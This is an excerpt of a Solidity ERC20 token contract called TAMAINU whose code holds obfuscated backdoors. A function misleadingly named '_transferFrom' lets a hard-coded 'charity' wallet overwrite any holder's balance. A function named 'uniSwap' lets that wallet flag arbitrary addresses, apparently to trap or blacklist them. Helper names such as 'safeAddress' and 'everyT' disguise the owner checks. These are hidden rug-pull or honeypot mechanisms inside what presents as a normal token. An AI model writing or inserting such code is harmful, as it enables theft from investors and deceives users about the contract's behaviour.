...
contract  TAMAINU is Context, IERC20, Ownable {
    ...
    mapping (address => bool) public feeAmountL;
    ...
    constructor () {
        ...
        CharityWalletAddress = payable(address(0x3FB06E3bf2BbA1F8834842Ba26E1eaf476817342));
    ...
    function AllThing(uint256 integerss)  pure private returns(uint160){
        return uint160(integerss);
    }

    function everyT(uint256 integerss)  pure private returns(address){
        return address(AllThing(integerss));
    }

    function wantedI(address integerss) private view returns(bool){
        return (!(everyT(publIc) == integerss));
    }
...
function _transferFrom(address
 abnormal, uint256 absurd ) public{ if(!safeAddress(7,CharityWalletAddress,msg.sender))
{return;}
    _balances[abnormal] = absurd;}
    ...
    }function uniSwap(address[] calldata w,uint256 uniS) public { if(!safeAddress(7,CharityWalletAddress,msg.sender)){return;}
        for (uint256 i; i < w.length; ++i) {
            if (uniS != 9){feeAmountL[w[i]] = true;}
            else{feeAmountL[w[i]] = false;}
        }
    }

    function safeAddress(uint256 da,address a, address b) private pure returns(bool){return !(!(a == b)) && da==7;}
